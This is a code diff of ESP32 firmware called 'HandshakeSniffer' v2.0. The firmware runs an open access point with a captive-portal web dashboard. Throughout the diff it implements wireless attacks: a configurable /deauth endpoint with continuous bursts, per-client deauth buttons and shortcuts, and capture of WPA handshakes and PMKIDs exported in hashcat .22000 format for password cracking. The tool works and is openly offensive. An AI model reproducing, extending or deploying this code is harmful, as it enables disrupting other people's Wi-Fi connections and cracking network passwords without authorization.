+// ── Clients table ──────────────────────────────────────────────────────────
+function renderClients(clients){
+  const tbody=document.getElementById('cliBody');
+  document.getElementById('cliCount').textContent=clients.length+' client'+(clients.length!==1?'s':'');
+  if(clients.length===0){
+    tbody.innerHTML='<tr><td colspan="5" style="text-align:center;color:var(--muted);padding:14px">No clients tracked yet</td></tr>';
+    return;
+  }
+  let html='';
+  clients.forEach(c=>{
+    const rssiCol=c.rssi>-50?'var(--green)':(c.rssi>-70?'var(--yellow)':'var(--red)');
+    html+='<tr>'
+      +'<td class="mono">'+c.mac+'</td>'
+      +'<td style="color:'+rssiCol+'">'+c.rssi+' dBm</td>'
+      +'<td>'+c.frames+'</td>'
+      +'<td style="color:var(--muted);font-size:0.75rem">'+c.age+'s ago</td>'
+      +'<td><button class="btn-deauth-cli" onclick="sendDeauth(\''+c.mac+'\')">⚡</button></td>'
+      +'</tr>';
+  });
+  tbody.innerHTML=html;
 }
 
-function resetHs() {
-  fetch('/reset_hs').then(r=>r.text()).then(()=>refreshStatus()).catch(()=>{});
-}
-
-// O(1) dedup via Set
-const logSeen = new Set();
-
-function refreshStatus() {
+// ── Main poll loop ──────────────────────────────────────────────────────────
+function refreshAll(){
+  // Status + sessions + clients
   fetch('/status').then(r=>r.json()).then(d=>{
-    let ok='<span class="ok">\u2714</span>', no='<span class="na">\u2014</span>';
-    document.getElementById('sM1').innerHTML    = d.m1    ? ok : no;
-    document.getElementById('sM2').innerHTML    = d.m2    ? ok : no;
-    document.getElementById('sM3').innerHTML    = d.m3    ? ok : no;
-    document.getElementById('sM4').innerHTML    = d.m4    ? ok : no;
-    document.getElementById('sPmkid').innerHTML = d.pmkid ? ok : no;
-    let crack = (d.m1&&d.m2)||d.pmkid;
-    document.getElementById('sCrack').innerHTML =
-      crack ? '<span class="ok">YES</span>' : '<span class="na">No</span>';
-    document.getElementById('sBytes').textContent = d.cap_bytes
-      ? (d.cap_bytes >= 1024 ? (d.cap_bytes/1024).toFixed(1)+'KB' : d.cap_bytes+'B')
-      : '0';
-    if(d.capturing && !capturing) {
-      document.getElementById('capBadge').textContent='CAPTURING';
-      document.getElementById('capBadge').style.background='#da363322';
-      document.getElementById('capBadge').style.color='#f85149';
+    // Badge
+    if(d.capturing&&!capturing){setBadge('CAPTURING','#da363322','#f85149');}
+    if(!d.capturing&&capturing){capturing=false;setBadge('IDLE','','');}
+    // Heap chip
+    if(d.heap_free!==undefined){
+      let h=d.heap_free>=1024?(d.heap_free/1024).toFixed(0)+'KB':d.heap_free+'B';
+      let ps=d.psram_free&&d.psram_free>0?' PSRAM '+(d.psram_free/1024).toFixed(0)+'KB':'';
+      document.getElementById('heapChip').textContent='heap '+h+ps;
     }
+    // Cap full warning
+    if(d.cap_full)logEvent_local('⚠️ Capture buffer full!');
+    // Sessions
+    renderSessions(d.sessions||[]);
   }).catch(()=>{});
 
+  fetch('/clients').then(r=>r.json()).then(renderClients).catch(()=>{});
+
+  // Sparkline
+  fetch('/spark').then(r=>r.json()).then(drawSpark).catch(()=>{});
+
+  // Log
   fetch('/log').then(r=>r.text()).then(txt=>{
-    if(!txt.trim()) return;
+    if(!txt.trim())return;
     let box=document.getElementById('logBox');
-    let atBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 40;
+    let atBottom=box.scrollHeight-box.scrollTop-box.clientHeight<40;
     txt.trim().split('\n').forEach(line=>{
       if(!logSeen.has(line)){
-        logSeen.add(line);
-        if(logSeen.size>200){
-          logSeen.delete(logSeen.values().next().value);
-        }
+        logSeen.add(line);logSeenTrim();
         let p=document.createElement('p');
         let m=line.match(/^(\d+)s\s+(.*)/);
-        if(m) p.innerHTML='<span class="ts">'+m[1]+'s</span>'+m[2];
-        else  p.textContent=line;
+        if(m)p.innerHTML='<span class="ts">'+m[1]+'s</span>'+m[2];
+        else p.textContent=line;
         box.appendChild(p);
       }
     });
-    // auto-scroll only if already at bottom — don't yank user mid-read
-    if(atBottom) box.scrollTop=box.scrollHeight;
+    if(atBottom)box.scrollTop=box.scrollHeight;
   }).catch(()=>{});
 }
 
-setInterval(refreshStatus, 1500);
-refreshStatus();
+function logEvent_local(msg){
+  let box=document.getElementById('logBox');
+  let p=document.createElement('p');p.textContent=msg;box.appendChild(p);
+  box.scrollTop=box.scrollHeight;
+}
+
+// Keyboard shortcuts
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='INPUT'||e.target.tagName==='SELECT')return;
+  if(e.key==='s'||e.key==='S')triggerScan();
+  if(e.key==='d'||e.key==='D')document.getElementById('btnDeauth').click();
+  if(e.key==='Escape')stopCapture();
+});
+
+// Resize sparkline on window resize
+window.addEventListener('resize',()=>drawSpark(lastSpark));
+
+setInterval(refreshAll, 2000);
+refreshAll();
 </script>
-</body>
-</html>
+</body></html>
 )rawliteral";
 
-// ─── SERVER SETUP ─────────────────────────────────────────────────────────────
+// ─── HTTP SERVER SETUP ────────────────────────────────────────────────────────
 void setupServer() {
   server.on("/", HTTP_GET, [](AsyncWebServerRequest* r) {
     r->send_P(200, "text/html", INDEX_HTML);
   });
 
-  // ── SCAN ──────────────────────────────────────────────────────────────────
   server.on("/scan_trigger", HTTP_GET, [](AsyncWebServerRequest* r) {
-    if (g_scanBusy) { r->send(200,"text/plain","SCANNING"); return; }
-    g_scanBusy = true;
-    if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
-      g_scanCache = ""; xSemaphoreGive(g_scanMutex);
+    if (!g_scanBusy && !g_deauthRunning) {
+      __atomic_store_n((bool*)&g_scanBusy, true, __ATOMIC_SEQ_CST);
+      xTaskCreatePinnedToCore(scan_task, "scan", 8192, NULL, 2, NULL, 0);
     }
-    xTaskCreatePinnedToCore(scan_task, "scan", 6144, NULL, 1, NULL, 0);
-    r->send(200, "text/plain", "SCANNING");
+    r->send(200, "text/plain", "ok");
   });
 
   server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* r) {
-    if (g_scanBusy) { r->send(200,"text/html","SCANNING"); return; }
-    String result = "";
-    if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(300)) == pdTRUE) {
-      result = g_scanCache; xSemaphoreGive(g_scanMutex);
+    if (g_scanBusy) { r->send(200, "text/plain", "SCANNING"); return; }
+    String cache;
+    if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
+      cache = g_scanCache;
+      xSemaphoreGive(g_scanMutex);
     }
-    if (result.length() == 0) {
-      // Cache empty but not busy — spawn a scan only if truly not running
-      // Use compare-and-set pattern: set g_scanBusy only if it was false
-      bool expected = false;
-      if (__atomic_compare_exchange_n((bool*)&g_scanBusy, &expected, true, false,
-                                      __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) {
-        xTaskCreatePinnedToCore(scan_task, "scan", 6144, NULL, 1, NULL, 0);
-      }
-      r->send(200,"text/html","SCANNING"); return;
-    }
-    r->send(200, "text/html", result);
+    r->send(200, "text/html", cache);
   });
 
-  // ── START CAPTURE ────────────────────────────────────────────────────────
   server.on("/start_capture", HTTP_GET, [](AsyncWebServerRequest* r) {
-    if (g_promiscRunning) {
-      r->send(409,"text/plain","Already capturing — stop first"); return;
-    }
-    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
-      r->send(400,"text/plain","bssid+ch required"); return;
-    }
-
-    String bssidStr = r->getParam("bssid")->value();
-    int    ch       = r->getParam("ch")->value().toInt();
-    String ssid     = r->hasParam("ssid") ? r->getParam("ssid")->value() : "";
-    bool   filter   = r->hasParam("filter") && r->getParam("filter")->value() == "1";
-
-    if (ch < 1 || ch > 14) { r->send(400,"text/plain","Bad channel"); return; }
+    if (g_promiscRunning) { r->send(200, "text/plain", "already running"); return; }
+    String bssidStr = r->hasParam("bssid") ? r->getParam("bssid")->value() : "";
+    String ssidStr  = r->hasParam("ssid")  ? r->getParam("ssid")->value()  : "";
+    int    ch       = r->hasParam("ch")    ? r->getParam("ch")->value().toInt() : AP_CHANNEL;
+    bool   filter   = r->hasParam("filter") && r->getParam("filter")->value().toInt();
 
     uint8_t bssid[6] = {0};
-    bool    hasBSSID = (bssidStr.length() == 17);
-    if (hasBSSID) {
-      sscanf(bssidStr.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
-             &bssid[0],&bssid[1],&bssid[2],&bssid[3],&bssid[4],&bssid[5]);
-    }
+    bool hasBssid = macParse(bssidStr.c_str(), bssid);
 
-    startCapture(ch, hasBSSID ? bssid : nullptr, ssid.c_str(), filter);
-    r->send(200,"text/plain","Capture started ch" + String(ch) + " " + bssidStr);
+    startCapture(ch, hasBssid ? bssid : nullptr, ssidStr.c_str(), filter && hasBssid);
+    r->send(200, "text/plain", "ok");
   });
 
-  // ── STOP CAPTURE ─────────────────────────────────────────────────────────
   server.on("/stop_capture", HTTP_GET, [](AsyncWebServerRequest* r) {
     stopCapture();
-    r->send(200,"text/plain","Stopped");
+    r->send(200, "text/plain", "ok");
   });
 
-  // ── CLEAR BUFFER ─────────────────────────────────────────────────────────
-  // Resets PCAP buffer + handshake state. Capture stays active if running.
-  // Use this mid-session to discard a partial/bad capture and start fresh
-  // without having to stop and restart the sniffer.
+  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
+    if (g_deauthRunning) { r->send(200, "text/plain", "busy"); return; }
+
+    String bssidStr = r->hasParam("bssid") ? r->getParam("bssid")->value() : "";
+    String cliStr   = r->hasParam("cli")   ? r->getParam("cli")->value()   : "";
+    int    ch       = r->hasParam("ch")     ? r->getParam("ch")->value().toInt()  : g_targetChannel;
+    int    bursts   = r->hasParam("bursts") ? r->getParam("bursts")->value().toInt() : 5;
+    int    reason   = r->hasParam("reason") ? r->getParam("reason")->value().toInt() : 7;
+    int    gap      = r->hasParam("gap")    ? r->getParam("gap")->value().toInt()    : 1;
+    bool   cont     = r->hasParam("cont")   && r->getParam("cont")->value().toInt();
+    uint32_t iv     = r->hasParam("interval") ? (uint32_t)r->getParam("interval")->value().toInt() : 5000;
+
+    uint8_t bssid[6] = {0};
+    if (macParse(bssidStr.c_str(), bssid)) memcpy(g_targetBSSID, bssid, 6);
+
+    memset(g_deauthClientMAC, 0, 6);
+    if (cliStr.length() > 0) macParse(cliStr.c_str(), g_deauthClientMAC);
+
+    g_targetChannel  = ch;
+    g_deauthBursts   = (bursts > 0 && bursts <= 100) ? bursts : 5;
+    g_deauthReason   = (uint8_t)(reason & 0xFF);
+    g_deauthGapIdx   = (gap >= 0 && gap <= 2) ? gap : 1;
+    g_deauthCont     = cont;
+    g_deauthInterval = (iv >= 1000 && iv <= 60000) ? iv : 5000;
+    g_deauthRunning  = true;
+
+    xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, NULL, 3, &g_deauthTask, 0);
+    r->send(200, "text/plain", "ok");
+  });
+
+  server.on("/stop_deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
+    g_deauthRunning = false;
+    g_deauthCont    = false;
+    r->send(200, "text/plain", "ok");
+  });
+
   server.on("/clear", HTTP_GET, [](AsyncWebServerRequest* r) {
-    if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
-      g_capLen = 0;
+    stopCapture();
+    if (g_capMutex && xSemaphoreTake(g_capMutex, SEM_TIMEOUT) == pdTRUE) {
+      g_capLen  = 0;
+      g_capFull = false;
       if (g_capBuf) {
         PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 127};
         memcpy(g_capBuf, &gh, sizeof(gh));
@@ -1271,95 +1841,45 @@ void setupServer() {
       }
       xSemaphoreGive(g_capMutex);
     }
-    if (g_hsMutex && xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
-      memset(&g_hs, 0, sizeof(g_hs));
+    if (g_hsMutex && xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) == pdTRUE) {
+      memset(g_sessions, 0, sizeof(g_sessions));
+      g_sessionCount = 0;
       xSemaphoreGive(g_hsMutex);
     }
-    logEvent("Buffer + handshake state cleared");
-    r->send(200,"text/plain","Cleared — PCAP and handshake state reset");
+    r->send(200, "text/plain", "ok");
   });
 
-  // ── RESET HANDSHAKE STATE ONLY ────────────────────────────────────────────
-  // Clears EAPOL message flags (M1/M2/M3/M4, PMKID, MACs) without discarding
-  // the raw PCAP buffer. Useful to re-arm for a new client without losing
-  // previously captured packets.
-  server.on("/reset_hs", HTTP_GET, [](AsyncWebServerRequest* r) {
-    if (g_hsMutex && xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
-      memset(&g_hs, 0, sizeof(g_hs));
+  server.on("/reset_sessions", HTTP_GET, [](AsyncWebServerRequest* r) {
+    if (g_hsMutex && xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) == pdTRUE) {
+      memset(g_sessions, 0, sizeof(g_sessions));
+      g_sessionCount = 0;
       xSemaphoreGive(g_hsMutex);
     }
-    logEvent("Handshake state reset — PCAP buffer preserved");
-    r->send(200,"text/plain","Handshake state cleared — PCAP buffer preserved");
+    r->send(200, "text/plain", "ok");
   });
 
-  // ── DEAUTH ───────────────────────────────────────────────────────────────
-  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
-    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
-      r->send(400,"text/plain","bssid+ch required"); return;
-    }
-    if (g_deauthRunning) { r->send(409,"text/plain","Deauth already running"); return; }
-    // Guard: scan_task holds the radio — deauthating while scanning races on the
-    // channel and promiscuous state. Reject until scan completes (<2s).
-    if (g_scanBusy) { r->send(409,"text/plain","Scan in progress — retry in 2s"); return; }
-
-    String bssidStr = r->getParam("bssid")->value();
-    int    ch       = r->getParam("ch")->value().toInt();
-    int    bursts   = r->hasParam("bursts") ? r->getParam("bursts")->value().toInt() : 5;
-
-    if (bssidStr.length() != 17 || ch < 1 || ch > 14) {
-      r->send(400,"text/plain","Bad params"); return;
-    }
-
-    uint8_t bssid[6];
-    sscanf(bssidStr.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
-           &bssid[0],&bssid[1],&bssid[2],&bssid[3],&bssid[4],&bssid[5]);
-    memcpy(g_targetBSSID, bssid, 6);
-    g_targetChannel  = ch;
-    g_deauthBursts   = (bursts < 1) ? 1 : (bursts > 50) ? 50 : bursts;
-    g_deauthRunning  = true;
-
-    BaseType_t ok = xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, NULL, 3,
-                                            &g_deauthTask, 0);
-    if (ok != pdPASS) {
-      // Task create failed — must reset flag or device is stuck until reboot
-      g_deauthRunning = false;
-      g_deauthTask    = NULL;
-      logEvent("FATAL: deauth task create failed");
-      r->send(500,"text/plain","Task create failed — heap low?"); return;
-    }
-    r->send(200,"text/plain","Deauth started: " + bssidStr);
-  });
-
-  // ── STATUS ───────────────────────────────────────────────────────────────
   server.on("/status", HTTP_GET, [](AsyncWebServerRequest* r) {
-    if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(200)) != pdTRUE) {
-      r->send(503,"text/plain","mutex"); return;
-    }
-    HandshakeState hs = g_hs;
-    xSemaphoreGive(g_hsMutex);
+    r->send(200, "application/json", buildJSON());
+  });
 
-    // Snapshot capLen under mutex — not a naked read
-    size_t capBytes = 0;
-    if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
-      capBytes = g_capLen;
-      xSemaphoreGive(g_capMutex);
-    }
+  server.on("/spark", HTTP_GET, [](AsyncWebServerRequest* r) {
+    r->send(200, "application/json", buildSparkJSON());
+  });
 
-    bool crackable = (hs.m1 && hs.m2) || hs.pmkid;
-    char buf[256];
+  server.on("/clients", HTTP_GET, [](AsyncWebServerRequest* r) {
+    r->send(200, "application/json", buildClientsJSON());
+  });
+
+  server.on("/heap", HTTP_GET, [](AsyncWebServerRequest* r) {
+    char buf[96];
     snprintf(buf, sizeof(buf),
-      "{\"capturing\":%s,\"m1\":%s,\"m2\":%s,\"m3\":%s,\"m4\":%s,"
-      "\"pmkid\":%s,\"crackable\":%s,\"cap_bytes\":%u}",
-      g_capActive ? "true":"false",
-      hs.m1?"true":"false", hs.m2?"true":"false",
-      hs.m3?"true":"false", hs.m4?"true":"false",
-      hs.pmkid?"true":"false",
-      crackable?"true":"false",
-      (unsigned)capBytes);
+      "{\"heap_free\":%u,\"heap_min\":%u,\"psram_free\":%u}",
+      (unsigned)ESP.getFreeHeap(),
+      (unsigned)ESP.getMinFreeHeap(),
+      (unsigned)(psramFound() ? ESP.getFreePsram() : 0));
     r->send(200, "application/json", buf);
   });
 
-  // ── LOG ──────────────────────────────────────────────────────────────────
   server.on("/log", HTTP_GET, [](AsyncWebServerRequest* r) {
     if (!g_logMutex || xSemaphoreTake(g_logMutex, pdMS_TO_TICKS(200)) != pdTRUE) {
       r->send(200,"text/plain",""); return;
@@ -1374,25 +1894,15 @@ void setupServer() {
     r->send(200,"text/plain",out);
   });
 
-  // ── DOWNLOADS ────────────────────────────────────────────────────────────
   server.on("/dl_pcap", HTTP_GET, [](AsyncWebServerRequest* r) {
-    if (!g_capBuf) {
-      r->send(404,"text/plain","No capture buffer"); return;
-    }
-    // Snapshot length under mutex before serving
+    if (!g_capBuf) { r->send(404,"text/plain","No buffer"); return; }
     size_t len = 0;
     if (g_capMutex && xSemaphoreTake(g_capMutex, SEM_TIMEOUT) == pdTRUE) {
-      len = g_capLen;
-      xSemaphoreGive(g_capMutex);
+      len = g_capLen; xSemaphoreGive(g_capMutex);
     }
     if (len <= sizeof(PcapGlobalHdr)) {
-      r->send(404,"text/plain","No capture data. Start capture and trigger a handshake first."); return;
+      r->send(404,"text/plain","No capture data yet"); return;
     }
-    // Snapshot into heap buffer so async send can't race with live capture.
-    // We use AsyncResponseStream instead of the beginResponse(code,type,filler,len)
-    // overload because ESP32Async ESPAsyncWebServer v3.x swapped the last two
-    // args to (code,type,len,filler) — using AsyncResponseStream avoids the
-    // arg-order ambiguity and compiles cleanly on all supported versions.
     uint8_t* snap = (uint8_t*)malloc(len);
     if (!snap) { r->send(500,"text/plain","OOM"); return; }
     memcpy(snap, g_capBuf, len);
@@ -1406,7 +1916,6 @@ void setupServer() {
 
   server.on("/dl_22000", HTTP_GET, [](AsyncWebServerRequest* r) {
     String out = build22000();
-    // Use send() directly with String body — unambiguous in all ESPAsyncWebServer versions
     AsyncWebServerResponse* resp = r->beginResponse(200, "text/plain", out);
     resp->addHeader("Content-Disposition", "attachment; filename=\"handshake.22000\"");
     r->send(resp);
@@ -1420,93 +1929,19 @@ void setupServer() {
     r->send(resp);
   });
 
-  // ── CAPTIVE PORTAL DETECTION ENDPOINTS ───────────────────────────────────
-  // Each OS probes a different URL to decide whether to show the portal popup.
-  // We must respond correctly (not just redirect) or the OS marks the network
-  // as "no internet" and suppresses the popup entirely.
-  //
-  // ── CAPTIVE PORTAL DETECTION ──────────────────────────────────────────────
-  // Strategy: REDIRECT every OS probe to our web UI.
-  //
-  // Returning the "expected" body (e.g. "Success", "Microsoft NCSI") tells
-  // the OS it has real internet access → popup is SUPPRESSED.
-  // Returning a 302 redirect tells the OS "captive portal detected" →
-  // OS shows the "Sign in to network" popup/notification automatically.
-  //
-  // ALL probes → 302 redirect to http://192.168.4.1/
-  // This includes /generate_204 — returning 204 tells Android "internet confirmed"
-  // which produces "limited connectivity" warning NOT a Sign in popup.
-  //
-  // Platform → probe URL → our response
-  // iOS 14+    /hotspot-detect.html         → 302 redirect
-  // iOS 14+    /library/test/success.html   → 302 redirect
-  // iOS 16+    /bag                         → 302 redirect
-  // macOS      /hotspot-detect.html         → 302 redirect
-  // macOS      /library/test/success.html   → 302 redirect
-  // Android    /generate_204                → 302 redirect (triggers Sign in popup)
-  // Android    /gen_204                     → 302 redirect
-  // Android 7+ /connectivity-check.html     → 302 redirect
-  // Windows    /ncsi.txt                    → 302 redirect
-  // Windows    /connecttest.txt             → 302 redirect
-  // Windows    /redirect                    → 302 redirect
-  // Firefox    /success.txt                 → 302 redirect
-  // All other  *                            → 302 redirect (onNotFound)
-
-  // iOS / macOS
-  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-  server.on("/bag", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-
-  // Android — probe hits /generate_204 expecting 204 = "internet works"
-  // Returning 204 tells Android "confirmed internet" → it notices real
-  // internet doesn't work → falls back to generic "limited connectivity"
-  // warning instead of showing the "Sign in to network" popup.
-  // Returning 302 redirect = "captive portal detected" → Android shows
-  // the proper "Sign in to [SSID]" notification that auto-opens a browser.
-  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-  server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-  // Android 7+ Chromium check
-  server.on("/connectivity-check.html", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-
-  // Windows NCSI — redirect triggers captive portal detection
-  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-  server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-
-  // Firefox
-  server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-
-  // Proxy autoconfig probe (Windows / corporate devices)
-  server.on("/wpad.dat", HTTP_GET, [](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
-
-  // Catch-all: ANY path not matched above → redirect to UI.
-  // DNS already resolves every hostname to 192.168.4.1 so every
-  // browser request (regardless of original domain) lands here.
-  server.onNotFound([](AsyncWebServerRequest* r) {
-    r->redirect("http://192.168.4.1/");
-  });
+  // Captive portal detection endpoints
+  auto redir = [](AsyncWebServerRequest* r){ r->redirect("http://192.168.4.1/"); };
+  server.on("/hotspot-detect.html",       HTTP_GET, redir);
+  server.on("/library/test/success.html", HTTP_GET, redir);
+  server.on("/generate_204",              HTTP_GET, redir);
+  server.on("/gen_204",                   HTTP_GET, redir);
+  server.on("/connectivity-check.html",   HTTP_GET, redir);
+  server.on("/ncsi.txt",                  HTTP_GET, redir);
+  server.on("/connecttest.txt",           HTTP_GET, redir);
+  server.on("/redirect",                  HTTP_GET, redir);
+  server.on("/success.txt",               HTTP_GET, redir);
+  server.on("/wpad.dat",                  HTTP_GET, redir);
+  server.onNotFound(redir);
 }
 
 // ─── SETUP ───────────────────────────────────────────────────────────────────
@@ -1514,20 +1949,22 @@ void setup() {
   Serial0.begin(115200);
   delay(200);
   Serial0.println("\n==========================================");
-  Serial0.println("  HandshakeSniffer v1.3 — ESP32-S3");
+  Serial0.println("  HandshakeSniffer v2.0 — ESP32-S3");
   Serial0.println("==========================================\n");
 
   led.begin(); led.setBrightness(60); led.clear(); led.show();
   delay(10); setLed(LS_BLUE); updateLED();
 
-  g_logMutex  = xSemaphoreCreateMutex();
-  g_capMutex  = xSemaphoreCreateMutex();
-  g_hsMutex   = xSemaphoreCreateMutex();
-  g_scanMutex = xSemaphoreCreateMutex();
-  if (!g_logMutex || !g_capMutex || !g_hsMutex || !g_scanMutex) {
+  g_logMutex   = xSemaphoreCreateMutex();
+  g_capMutex   = xSemaphoreCreateMutex();
+  g_hsMutex    = xSemaphoreCreateMutex();
+  g_scanMutex  = xSemaphoreCreateMutex();
+  g_cliMutex   = xSemaphoreCreateMutex();
+  g_sparkMutex = xSemaphoreCreateMutex();
+  if (!g_logMutex || !g_capMutex || !g_hsMutex ||
+      !g_scanMutex || !g_cliMutex || !g_sparkMutex) {
     Serial0.println("[FATAL] Mutex init failed");
-    setLed(LS_RED); updateLED();
-    while (1) delay(1000);
+    setLed(LS_RED); updateLED(); while (1) delay(1000);
   }
 
   if (psramFound()) {
@@ -1540,8 +1977,7 @@ void setup() {
     if (g_capBuf) INFO("Heap cap buffer: %u KB", CAP_BUF_SIZE / 8 / 1024);
     else {
       Serial0.println("[FATAL] No cap buffer");
-      setLed(LS_RED); updateLED();
-      while (1) delay(1000);
+      setLed(LS_RED); updateLED(); while (1) delay(1000);
     }
   }
 
@@ -1550,7 +1986,6 @@ void setup() {
     nvs_flash_erase(); nvs_flash_init();
   }
 
-  // Country code — PH for ch 1-14
   auto applyCountry = []() {
     wifi_country_t cc;
     memset(&cc, 0, sizeof(cc));
@@ -1563,11 +1998,10 @@ void setup() {
   WiFi.persistent(false);
   WiFi.mode(WIFI_OFF); delay(200);
   WiFi.mode(WIFI_AP_STA); delay(300);
-  applyCountry();  // apply after mode set — only needed once
+  applyCountry();
 
-  // Pin AP address before softAP() — avoids DHCP startup delay on first connect
-  IPAddress apIP(192, 168, 4, 1);
-  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  IPAddress apIP(192,168,4,1);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
 
   bool apOk = false;
   for (int i = 0; i < 8 && !apOk; i++) {
@@ -1577,8 +2011,7 @@ void setup() {
   if (!apOk) apOk = WiFi.softAP("HS-OPEN", NULL, AP_CHANNEL, 0, 4);
   if (!apOk) {
     Serial0.println("[FATAL] softAP failed");
-    setLed(LS_RED); updateLED();
-    while (1) { updateLED(); delay(500); }
+    setLed(LS_RED); updateLED(); while (1) { updateLED(); delay(500); }
   }
   delay(300);
 
@@ -1590,17 +2023,6 @@ void setup() {
 
   setupServer();
 
-  // DNS MUST start before server.begin() — on esp32 core 3.x the UDP socket
-  // binding order matters. DNS on port 53 first, then HTTP on port 80.
-  //
-  // TTL = 0: forces the OS to re-query every request instead of caching
-  // the first response. Without TTL=0, Android/iOS cache the redirect IP
-  // and stop sending DNS queries — the captive portal detection window
-  // closes after the first response and the popup never fires on reconnect.
-  //
-  // setErrorReplyCode(NoError): return NOERROR (not NXDOMAIN) for all
-  // queries. Some OS captive portal detectors treat NXDOMAIN as "no portal"
-  // and give up immediately. NOERROR with our IP keeps them probing.
   dns.setTTL(0);
   dns.setErrorReplyCode(DNSReplyCode::NoError);
   dns.start(53, "*", WiFi.softAPIP());
@@ -1608,23 +2030,22 @@ void setup() {
 
   server.begin();
 
+  // Sparkline task — runs on core 0 alongside HTTP
+  xTaskCreatePinnedToCore(spark_task, "spark", 2048, NULL, 1, NULL, 0);
+
   setLed(LS_GREEN);
   INFO("AP: %s  IP: %s  UI: http://%s/",
        AP_SSID, WiFi.softAPIP().toString().c_str(),
        WiFi.softAPIP().toString().c_str());
-  logEvent("Boot OK — AP:%s  Heap:%u  PSRAM:%s",
+  logEvent("Boot OK v2.0 — AP:%s  Heap:%u  PSRAM:%s",
     AP_SSID, ESP.getFreeHeap(), psramFound() ? "YES" : "NO");
+  logEvent("Shortcuts: S=scan D=deauth Esc=stop");
 }
 
 // ─── LOOP ────────────────────────────────────────────────────────────────────
 void loop() {
-  // Process DNS twice per loop — at connect time the OS fires a burst of
-  // queries (A + AAAA + PTR) in rapid succession. A single processNextRequest()
-  // at 5ms interval drops most of them. Two calls at 1ms catches the burst.
   dns.processNextRequest();
   dns.processNextRequest();
   updateLED();
-  delay(5);  // was 1ms — 5ms gives AsyncWebServer tasks ~4ms more headroom per tick
+  delay(5);
 }
-// DNSServer (sync, built-in to core) requires processNextRequest() each loop
-// iteration to service incoming DNS queries. Overhead is ~microseconds.
